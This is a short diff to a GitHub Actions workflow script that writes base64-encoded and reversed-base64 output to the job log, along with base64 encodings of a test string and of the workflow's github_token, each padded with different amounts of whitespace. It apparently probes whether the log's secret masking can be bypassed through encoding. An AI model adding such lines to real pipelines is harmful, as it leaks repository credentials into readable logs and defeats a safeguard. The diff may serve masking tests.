@@ -30,13 +30,13 @@ jobs:
             core.info(output);
             core.info(Buffer.from(output).toString('base64').split('').reverse().join(''));
             core.info(Buffer.from(output).toString('base64'));
-            core.info('my-secret: ' + base64('my-secret')) 
-            core.info(' my-secret: ' + base64('my-secret')) 
-            core.info('  my-secret: ' + base64('my-secret')) 
-            core.info('   my-secret: ' + base64('my-secret'))
+            core.info('my secret: ' + base64('my-secret')) 
+            core.info(' my secret: ' + base64(' my-secret')) 
+            core.info('  my secret: ' + base64('  my-secret')) 
+            core.info('   my secret: ' + base64('  my-secret'))
             core.info('github-token: ' + base64('' + secret['github_token'])) 
-            core.info('github-token: ' + base64(' ' + secret['github_token'])) 
-            core.info('github-token: ' + base64('  ' + secret['github_token'])) 
-            core.info('github-token: ' + base64('   ' + secret['github_token'])) 
-            core.info('github-token: ' + base64('    ' + secret['github_token'])) 
+            core.info(' github-token: ' + base64(' ' + secret['github_token'])) 
+            core.info('  github-token: ' + base64('  ' + secret['github_token'])) 
+            core.info('   github-token: ' + base64('   ' + secret['github_token'])) 
+            core.info('    github-token: ' + base64('    ' + secret['github_token'])) 
             return Buffer.from(output).toString('base64');
